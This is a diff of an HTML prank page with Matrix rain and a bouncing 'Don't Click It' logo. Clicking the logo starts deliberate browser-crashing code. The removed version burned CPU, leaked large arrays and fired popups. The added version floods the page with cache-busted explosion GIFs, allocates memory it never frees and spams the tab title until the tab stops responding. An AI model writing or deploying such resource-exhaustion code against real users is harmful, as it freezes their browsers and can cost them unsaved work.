@@ -1,184 +1,218 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Matrix + Don't Click It</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body { margin:0; overflow:hidden; background:#000; color:#0f0; font-family:monospace; height:100vh; user-select:none; }
-    canvas { position:fixed; inset:0; }
-    #logo-container {
-        position:absolute; z-index:10; pointer-events:none; text-align:center;
-        left:50%; top:50%; transform:translate(-50%,-50%);
-    }
-    #logo { 
-        pointer-events:auto; cursor:pointer; image-rendering:pixelated; 
-        width: clamp(180px, 45vw, 260px);
-    }
-    #nuke-button {
-        margin-top:18px; padding:10px 28px; font-size:1.1rem; font-weight:bold;
-        background:#900; color:white; border:3px solid #fff; border-radius:6px;
-        cursor:pointer; display:none; pointer-events:auto;
-    }
-    #nuke-button:hover { background:#f00; transform:scale(1.07); }
-    #crash-overlay {
-        position:fixed; inset:0; z-index:9999; pointer-events:none;
-        background:rgba(180,0,0,0.94); color:white;
-        font-size:clamp(2.5rem,8vw,5.5rem); font-weight:bold;
-        display:flex; flex-direction:column; align-items:center; justify-content:center;
-        opacity:0; transition:opacity 0.5s;
-    }
-    #crash-gif { width:clamp(240px,60vmin,520px); margin-bottom:20px; border:5px solid #fff; }
-    .warning { font-size:clamp(1.3rem,4vw,2.2rem); color:#ff3; margin-top:16px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matrix + Don't Click It</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: black;
+            color: #0f0;
+            font-family: monospace;
+            user-select: none;
+            height: 100vh;
+            position: relative;
+        }
+        canvas {
+            display: block;
+            position: fixed;
+            inset: 0;
+            z-index: 1;
+        }
+        #logo-container {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 10;
+            text-align: center;
+        }
+        #logo {
+            pointer-events: auto;
+            cursor: pointer;
+            image-rendering: pixelated;
+            width: min(260px, 55vw);
+            max-width: 260px;
+        }
+        #crash-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(200,0,0,0.85);
+            color: white;
+            font-size: clamp(3rem, 8vw, 7rem);
+            font-weight: bold;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 9999;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .warning {
+            font-size: clamp(1.5rem, 5vw, 3rem);
+            color: #ff0;
+            text-shadow: 0 0 16px #ff0;
+            margin-top: 30px;
+            animation: blink 1s infinite alternate;
+        }
+        @keyframes blink {
+            from { opacity: 0.5; }
+            to   { opacity: 1.0; }
+        }
+        .boom {
+            position: absolute;
+            width:  clamp(80px,  12vw,  280px);
+            height: auto;
+            pointer-events: none;
+            z-index: 5;
+            opacity: 0.92;
+            transform: translate(-50%, -50%);
+            image-rendering: pixelated;
+        }
+    </style>
 </head>
 <body>
+    <canvas id="matrix"></canvas>
+    <div id="logo-container">
+        <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png" alt="Don't Click It">
+    </div>
 
-<canvas id="c"></canvas>
+    <div id="crash-overlay">
+        <div>DESTRUCTION SEQUENCE INITIATED</div>
+        <div class="warning">THIS TAB WILL BECOME UNRESPONSIVE</div>
+    </div>
 
-<div id="logo-container">
-    <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png">
-    <button id="nuke">NUKE THIS SYSTEM</button>
-</div>
+    <script>
+        // ─── Matrix Rain (unchanged) ─────────────────────────────
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        let columns, drops;
 
-<div id="crash-overlay">
-    <img id="crash-gif" src="https://media.tenor.com/9u3t3c3dG3IAAAAC/nuclear-explosion-bomb.gif">
-    <div id="msg">DESTRUCTION SEQUENCE STARTED</div>
-    <div class="warning">THIS WILL CRASH YOUR BROWSER</div>
-</div>
-
-<script>
-// ─── Matrix ────────────────────────────────────────────────
-const c = document.getElementById('c');
-const ctx = c.getContext('2d');
-let w, h, cols, drops = [];
-
-function resize() {
-    w = c.width = innerWidth;
-    h = c.height = innerHeight;
-    cols = Math.floor(w / 16);
-    drops = Array(cols).fill(1);
-}
-resize();
-addEventListener('resize', resize);
-
-setInterval(() => {
-    ctx.fillStyle = 'rgba(0,0,0,0.07)';
-    ctx.fillRect(0,0,w,h);
-    ctx.fillStyle = '#0f0';
-    ctx.font = '15px monospace';
-    const s = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    for (let i = 0; i < cols; i++) {
-        const ch = s[Math.floor(Math.random()*s.length)];
-        ctx.fillText(ch, i*16, drops[i]*16);
-        if (drops[i]*16 > h && Math.random() > 0.97) drops[i] = 0;
-        drops[i]++;
-    }
-}, 40);
-
-// ─── Bouncing logo ─────────────────────────────────────────
-const box = document.getElementById('logo-container');
-let x = innerWidth*0.5 - 130;
-let y = innerHeight*0.5 - 70;
-let vx = (Math.random()>0.5?1:-1)*(1.6 + Math.random()*1.4);
-let vy = (Math.random()>0.5?1:-1)*(1.6 + Math.random()*1.4);
-
-function move() {
-    x += vx; y += vy;
-    const bw = box.offsetWidth || 260;
-    const bh = box.offsetHeight || 120;
-    if (x < 0 || x+bw > innerWidth) vx = -vx;
-    if (y < 0 || y+bh > innerHeight) vy = -vy;
-    box.style.left = x+'px';
-    box.style.top  = y+'px';
-    requestAnimationFrame(move);
-}
-move();
-
-// ─── Nuke logic ────────────────────────────────────────────
-const logo   = document.getElementById('logo');
-const btn    = document.getElementById('nuke');
-const overlay= document.getElementById('crash-overlay');
-const msg    = document.getElementById('msg');
-
-logo.onclick = () => {
-    btn.style.display = 'block';
-    logo.style.pointerEvents = 'none';
-    overlay.style.opacity = '0.75';
-    setTimeout(() => overlay.style.opacity='0', 1400);
-};
-
-let destroyed = false;
-
-btn.onclick = () => {
-    if (destroyed) return;
-    destroyed = true;
-
-    btn.remove();
-    logo.remove();
-    overlay.style.opacity = '1';
-    msg.textContent = "TERMINATING...";
-
-    // 1. Title + unicode spam
-    let i = 0;
-    function titlespam() {
-        document.title = "☠ CRASHING ☠ ".repeat(6) + i + " 死".repeat(i%20);
-        i++;
-        requestAnimationFrame(titlespam);
-    }
-    titlespam();
-
-    // 2. Memory pressure
-    const trash = [];
-    function leak() {
-        try {
-            trash.push(new Array(800000).fill('💀'.repeat(300)));
-            trash.push(new Uint8Array(48*1024*1024));
-            trash.push(new Float64Array(4000000));
-        } catch {}
-        setTimeout(leak, 40);
-    }
-    leak();
-
-    // 3. CPU burn (main thread)
-    function burn() {
-        let x = 0;
-        const start = performance.now();
-        while (performance.now() - start < 180) {
-            x += Math.sin(x * 1.41421356237) * Math.random();
+        function resizeMatrix() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const fontSize = 16;
+            columns = Math.floor(canvas.width / fontSize);
+            drops = new Array(columns).fill(1);
         }
-        requestAnimationFrame(burn);
-    }
-    burn();
 
-    // 4. Try many small popups (most will be blocked)
-    const popupSizes = [
-        [380,280], [420,320], [360,400], [500,300],
-        [340,460], [450,350], [390,410]
-    ];
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0,0,0,0.06)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = '16px monospace';
+            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            for (let i = 0; i < columns; i++) {
+                const txt = chars[Math.floor(Math.random() * chars.length)];
+                const x = i * 16;
+                const y = drops[i] * 16;
+                ctx.fillText(txt, x, y);
+                if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
 
-    function tryPopup() {
-        const [pw,ph] = popupSizes[Math.floor(Math.random()*popupSizes.length)];
-        const l = Math.floor(Math.random()*(screen.availWidth - pw - 40));
-        const t = Math.floor(Math.random()*(screen.availHeight - ph - 80));
-        try {
-            window.open(
-                'about:blank',
-                '_blank',
-                `width=${pw},height=${ph},left=${l},top=${t},menubar=no,toolbar=no`
-            );
-        } catch {}
-    }
+        resizeMatrix();
+        window.addEventListener('resize', resizeMatrix);
+        setInterval(drawMatrix, 45);
 
-    for (let k = 0; k < 14; k++) {
-        setTimeout(tryPopup, k * 220 + Math.random()*300);
-    }
+        // ─── Bouncing logo (slightly simplified) ─────────────────
+        const logoContainer = document.getElementById('logo-container');
+        let logoX = window.innerWidth * 0.5 - 130;
+        let logoY = window.innerHeight * 0.5 - 70;
+        let vx = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);
+        let vy = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.4);
 
-    // Visual chaos
-    setInterval(() => {
-        document.body.style.background = `hsl(${Math.random()*360}, 90%, 18%)`;
-    }, 120);
-};
-</script>
+        function animateLogo() {
+            const w = logoContainer.offsetWidth  || 260;
+            const h = logoContainer.offsetHeight || 140;
+            logoX += vx;
+            logoY += vy;
+            if (logoX <= 0 || logoX + w >= window.innerWidth)  vx = -vx;
+            if (logoY <= 0 || logoY + h >= window.innerHeight) vy = -vy;
+            logoContainer.style.left = logoX + 'px';
+            logoContainer.style.top  = logoY + 'px';
+            requestAnimationFrame(animateLogo);
+        }
+        animateLogo();
+
+        // ─── Nuke logic ──────────────────────────────────────────
+        const overlay  = document.getElementById('crash-overlay');
+        const logo     = document.getElementById('logo');
+        const gifUrl   = "https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif";
+
+        let destroyed = false;
+
+        logo.addEventListener('click', () => {
+            if (destroyed) return;
+            destroyed = true;
+
+            logo.style.pointerEvents = 'none';
+            logo.style.opacity = '0.4';
+            overlay.style.opacity = '1';
+
+            // Start spamming explosion GIFs very aggressively
+            function spawnBoom() {
+                if (!destroyed) return;
+
+                const img = document.createElement('img');
+                img.src = gifUrl + '?cache=' + Math.random(); // try to defeat cache
+                img.className = 'boom';
+                img.alt = "BOOM";
+
+                // Random position
+                const x = Math.random() * 100;
+                const y = Math.random() * 100;
+                img.style.left = x + 'vw';
+                img.style.top  = y + 'vh';
+
+                // Random slight rotation & scale variation
+                const rot = (Math.random() - 0.5) * 60;
+                const scale = 0.7 + Math.random() * 0.9;
+                img.style.transform += ` rotate(${rot}deg) scale(${scale})`;
+
+                document.body.appendChild(img);
+
+                // Remove old images sometimes so we don't completely freeze instantly on some browsers
+                if (Math.random() < 0.08) {
+                    const old = document.querySelectorAll('.boom');
+                    if (old.length > 120) {
+                        old[Math.floor(Math.random()*old.length)].remove();
+                    }
+                }
+            }
+
+            // ≈ 1000 images / minute = ~16–17 per second
+            const fastInterval = setInterval(spawnBoom, 60);
+
+            // Even more aggressive burst every ~4 seconds
+            setInterval(() => {
+                for (let i = 0; i < 35; i++) {
+                    setTimeout(spawnBoom, i * 30);
+                }
+            }, 4200);
+
+            // Extra memory pressure attempt
+            const leak = [];
+            setInterval(() => {
+                try {
+                    leak.push(new ArrayBuffer(8 * 1024 * 1024));
+                    leak.push(document.createElement('div')); // dom nodes too
+                } catch {}
+            }, 400);
+
+            // Title spam for extra annoyance
+            let counter = 0;
+            setInterval(() => {
+                document.title = "CRASHING".repeat((counter++ % 6) + 1) + " ☠ " + counter;
+            }, 180);
+        });
+    </script>
 </body>
 </html>
